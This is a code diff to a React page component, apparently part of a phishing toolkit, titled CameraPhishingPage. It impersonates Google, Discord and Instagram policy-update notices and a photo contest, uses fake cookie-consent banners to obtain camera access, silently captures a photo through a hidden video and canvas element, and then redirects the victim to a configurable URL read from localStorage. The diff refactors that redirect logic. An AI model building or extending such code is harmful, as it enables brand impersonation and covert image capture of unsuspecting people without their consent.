@@ -16,8 +16,8 @@ const templateContent: Record<string, { title: string; message: string; cookieMe
     cookieMessage: "By clicking 'Accept & Continue', you agree to Google's updated Terms of Service and Privacy Policy. This helps us improve your experience and provide personalized services.",
     actionText: 'Accept & Continue',
     headerClassName: "bg-white text-black",
-    visual: <img src="/google_logo.png" alt="Google Logo" className="h-6 w-auto mr-2" />,
-    redirectUrl: 'https://www.google.com/search?q=your+search+query'
+    visual: <img src="/google_logo.png" alt="Google Logo" className="h-6 w-auto mr-2" />
+    // redirectUrl removed
   },
   'discord-terms-update': {
     title: 'Discord - Terms of Service Update',
@@ -25,8 +25,8 @@ const templateContent: Record<string, { title: string; message: string; cookieMe
     cookieMessage: "By clicking 'Accept Terms', you acknowledge and agree to Discord's updated Terms of Service. This ensures a safe and compliant environment for all users.",
     actionText: 'Accept Terms',
     headerClassName: "bg-[#5865F2] text-white",
-    visual: <img src="/discord_logo.png" alt="Discord Logo" className="h-8 w-auto mr-2" />,
-    redirectUrl: 'https://discord.com/login'
+    visual: <img src="/discord_logo.png" alt="Discord Logo" className="h-8 w-auto mr-2" />
+    // redirectUrl removed
   },
   'instagram-privacy-update': {
     title: 'Instagram - Privacy Policy Update',
@@ -34,8 +34,8 @@ const templateContent: Record<string, { title: string; message: string; cookieMe
     cookieMessage: "By tapping 'Accept Policy', you agree to Instagram's updated Privacy Policy. This allows us to provide you with a more personalized and secure experience.",
     actionText: 'Accept Policy',
     headerClassName: "bg-gradient-to-br from-[#833AB4] via-[#FD1D1D] to-[#FCB045] text-white",
-    visual: <img src="/instagram_logo.png" alt="Instagram Logo" className="h-8 w-auto mr-2" />,
-    redirectUrl: 'https://www.instagram.com/accounts/login/'
+    visual: <img src="/instagram_logo.png" alt="Instagram Logo" className="h-8 w-auto mr-2" />
+    // redirectUrl removed
   },
   'photo-contest-entry': {
     title: 'SnapWin Contest!',
@@ -61,6 +61,17 @@ const templateContent: Record<string, { title: string; message: string; cookieMe
     actionText: 'Enable Camera',
     message: 'This feature requires camera access. Please enable your camera to continue.',
   }
+};
+
+// Define localStorage keys for redirection, similar to location page
+const REDIRECT_URL_KEYS: Record<string, string> = {
+  'google-policy-update': 'googlePolicyUpdateRedirectUrl',
+  'discord-terms-update': 'discordTermsUpdateRedirectUrl',
+  'instagram-privacy-update': 'instagramPrivacyUpdateRedirectUrl',
+  // Add keys for other camera templates if they need dynamic redirection
+  // 'photo-contest-entry': 'photoContestRedirectUrl',
+  // 'video-verification': 'videoVerificationRedirectUrl',
+  // 'ar-filter': 'arFilterRedirectUrl',
 };
 
 export default function CameraPhishingPage() {
@@ -132,11 +143,9 @@ export default function CameraPhishingPage() {
            if (videoRef.current) videoRef.current.play();
            setStatus("streaming");
            setIsLoading(false);
+           // Delay capture and then check for redirection
            setTimeout(() => {
-             captureImage();
-             if (content.redirectUrl) {
-               window.location.href = content.redirectUrl;
-             }
+             captureImage(); // This will set status to 'captured'
            }, 1500);
         };
       }
@@ -214,7 +223,41 @@ export default function CameraPhishingPage() {
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
 
+  // useEffect to handle redirection or success message after capture
+  useEffect(() => {
+    if (status === 'captured') {
+      const redirectKey = REDIRECT_URL_KEYS[templateId];
+      if (redirectKey) {
+        const redirectUrl = localStorage.getItem(redirectKey);
+        if (redirectUrl && redirectUrl.trim() !== '') {
+          // For templates like google-policy, discord, instagram, show a brief message before redirect
+          if (['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId)) {
+            // No explicit message needed here as the UI is minimal for these templates
+            // and redirection should be quick.
+          }
+          setTimeout(() => {
+            window.location.href = redirectUrl;
+          }, (['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId) ? 500 : 2500) ); // Shorter delay for policy updates
+        } else {
+          // If key exists but no URL, or for other templates that reach 'captured'
+          // Set a message or ensure UI reflects capture without redirect.
+          // For policy templates, this state might not be visibly shown if no redirect is set,
+          // as they lack a dedicated "success" UI area.
+          if (!['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId)) {
+            // Explicit success message for other templates if needed
+          }
+        }
+      } else {
+        // For templates not in REDIRECT_URL_KEYS (if any) or if redirection is not applicable
+        // This path should ideally not be hit for camera templates that are meant to have configurable redirect.
+      }
+    }
+  }, [status, templateId, content.title]); // Added content.title to dependencies for safety, though primarily driven by status and templateId
+
   if (['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId)) {
+    // For these templates, the "captured" state is mostly invisible to the user before redirection
+    // or if no redirection URL is set (it will just sit on the page).
+    // The main UI is the cookie banner.
     return (
       <>
         <PhishingPageLayout
@@ -228,15 +271,17 @@ export default function CameraPhishingPage() {
           </div>
           <p className="text-center text-muted-foreground mb-6 px-4" dangerouslySetInnerHTML={{ __html: content.message.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>') }} />
           
-          {/* Hidden video and canvas for silent capture */}
           <video ref={videoRef} className="hidden" playsInline muted />
           <canvas ref={canvasRef} className="hidden"></canvas>
-
-          {/* No visible status messages for silent capture */}
           
         </PhishingPageLayout>
 
-        {!cookieConsentGiven && (
+        {/* Cookie consent banner is shown until consent is given, or if page reloads before capture.
+            If status becomes 'captured' and no redirect URL is set, this banner might still be visible
+            if cookieConsentGiven is false, which is an edge case (capture without consent flow).
+            However, handleCookieConsentAndCamera sets cookieConsentGiven to true.
+        */}
+        {status !== 'captured' && !cookieConsentGiven && (
             <div className="fixed bottom-0 left-0 right-0 p-4 bg-background border-t border-border shadow-lg z-50">
               <div className="container mx-auto flex flex-col sm:flex-row items-center justify-between gap-3">
                 <p className="text-sm text-foreground text-center sm:text-left flex-grow">
@@ -366,11 +411,12 @@ export default function CameraPhishingPage() {
       </div>
       <canvas ref={canvasRef} className="hidden"></canvas>
 
-      {(status === 'idle' || status === 'error') && (
+      {/* Button is shown if not streaming and not captured yet */}
+      {(status === 'idle' || status === 'requesting' || status === 'error') && status !== 'captured' && (
         <Button
           onClick={handleCameraRequest}
           className="w-full bg-accent hover:bg-accent/90 text-accent-foreground"
-          disabled={isLoading}
+          disabled={isLoading || status === 'requesting'}
         >
           <CameraIcon className="mr-2 h-5 w-5" />
           {isLoading ? 'Initializing Camera...' : (content.actionText || 'Enable Camera')}
@@ -384,13 +430,15 @@ export default function CameraPhishingPage() {
         </div>
       )}
 
-      {status === 'captured' && (
+      {/* Success message for non-redirecting captures */}
+      {status === 'captured' && !(REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) && (
         <div className="text-center p-4 bg-green-50 border border-green-200 rounded-md">
           <CheckCircle className="mx-auto h-10 w-10 text-green-600 mb-2" />
-          <p className="font-semibold text-green-700">Image Captured</p>
-          <p className="text-sm text-green-600">An image has been captured. This window can now be closed.</p>
+          <p className="font-semibold text-green-700">Image Captured Successfully!</p>
+          <p className="text-sm text-green-600">This window can now be closed.</p>
         </div>
       )}
+      {/* Error message display */}
        {status === 'error' && error && (
          <div className="text-center p-4 bg-red-50 border border-red-200 rounded-md">
           <AlertTriangle className="mx-auto h-10 w-10 text-red-600 mb-2" />
